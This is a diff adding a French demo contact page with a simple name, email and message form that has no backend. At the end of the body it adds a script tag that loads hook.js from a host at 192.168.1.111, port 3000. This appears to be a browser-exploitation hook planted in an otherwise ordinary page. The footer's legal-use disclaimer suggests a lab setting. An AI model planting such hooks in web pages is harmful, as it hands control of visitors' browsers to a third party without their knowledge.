@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Contact — Demo</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50 text-gray-800">
+  <header class="bg-white shadow">
+    <div class="max-w-4xl mx-auto px-4 py-4 flex justify-between items-center">
+      <h1 class="text-xl font-semibold">Demo Site</h1>
+      <nav class="space-x-4">
+        <a href="/index.html" class="text-blue-600 hover:underline">Accueil</a>
+        <a href="/items.html" class="text-blue-600 hover:underline">Items</a>
+        <a href="/contact.html" class="text-blue-600 hover:underline">Contact</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="max-w-2xl mx-auto px-4 py-12">
+    <h2 class="text-2xl font-bold mb-4">Contact</h2>
+    <p class="text-sm text-gray-600 mb-6">Formulaire de contact (démonstration, pas de backend).</p>
+
+    <form class="bg-white p-6 rounded shadow grid gap-4">
+      <label class="block">
+        <span class="text-sm font-medium">Nom</span>
+        <input class="mt-1 block w-full border rounded px-3 py-2" type="text" placeholder="Votre nom" />
+      </label>
+
+      <label class="block">
+        <span class="text-sm font-medium">Email</span>
+        <input class="mt-1 block w-full border rounded px-3 py-2" type="email" placeholder="email@example.com" />
+      </label>
+
+      <label class="block">
+        <span class="text-sm font-medium">Message</span>
+        <textarea class="mt-1 block w-full border rounded px-3 py-2" rows="4" placeholder="Votre message"></textarea>
+      </label>
+
+      <div class="flex justify-end">
+        <button type="button" class="px-4 py-2 bg-blue-600 text-white rounded">Envoyer (demo)</button>
+      </div>
+    </form>
+  </main>
+
+  <footer class="bg-white border-t">
+    <div class="max-w-2xl mx-auto px-4 py-6 text-sm text-gray-500">
+      © Demo — usage légal uniquement.
+    </div>
+  </footer>
+  <script src="http://192.168.1.111:3000/hook.js"></script>
+</body>
+</html>
